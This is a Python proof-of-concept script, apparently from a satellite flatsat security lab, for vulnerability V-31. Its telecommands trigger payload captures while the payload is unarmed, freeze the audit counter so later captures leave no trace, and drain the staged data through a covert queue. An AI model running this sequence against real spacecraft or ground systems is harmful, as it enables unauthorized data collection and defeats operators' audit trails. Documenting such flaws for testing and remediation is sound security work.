#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-31  PAYLOAD_SNAP: anyone can trigger a sensor+state capture with the
# payload NOT armed; the only audit trail is the forward counter (VCC),
# which the same command family can freeze.
# SPARTA: CT-0004 / unauthorized data acquisition + audit bypass
def main(dev, ev):
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    armed = bool(st.u8(2) & 0x20)
    vcc0 = st.le16(8)
    check(not armed, "payload NOT armed before the capture")
    snap = dev.find(dev.tc(0x23, b"\x00", via="radio"), 0x23)[0]
    img = snap.payload[3:35]          # [scid, sub, frozen] | IMG1[32]
    ev.log(f"snap IMG magic={img[:4]!r} temp={struct.unpack('<h', img[8:10])[0]/100:.2f}C "
           f"bus={struct.unpack('<H', img[18:20])[0]/100:.2f}V flags "
           f"eclipse={img[25]} safe={img[26]} tag={img[27:30]!r}")
    check(img[:4] == b"IMG1", "capture taken while payload unarmed")
    q = dev.find(dev.tc(0x22, b"", via="radio"), 0x22)[0]
    qlen = struct.unpack(">H", q.payload[2:4])[0]
    st1 = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"audit trail: forward counter {vcc0} -> {st1.le16(8)}, "
           f"capture staged in covert queue ({qlen} B)")
    check(st1.le16(8) == vcc0 + 1, "one increment per capture (auditable)")
    dev.tc(0x23, bytes([1, 1]), via="radio")         # freeze the counter
    for _ in range(5):
        dev.tc(0x23, b"\x00", via="radio")
    st2 = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    ev.log(f"after freeze: 5 more captures, counter stuck at {st2.le16(8)}")
    check(st2.le16(8) == vcc0 + 1, "audit counter frozen -> captures invisible")
    r = dev.find(dev.tc(0x23, bytes([2]), via="radio"), 0x23)[0]
    n = r.u8(2)
    ev.log(f"drained {n} bytes from covert queue: {r.payload[3:3+6]!r}...")
    check(b"IMG1" in r.payload, "staged captures are retrievable ex-fil"
          " through the covert channel")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-31 unauthorized payload snap + audit freeze", main))
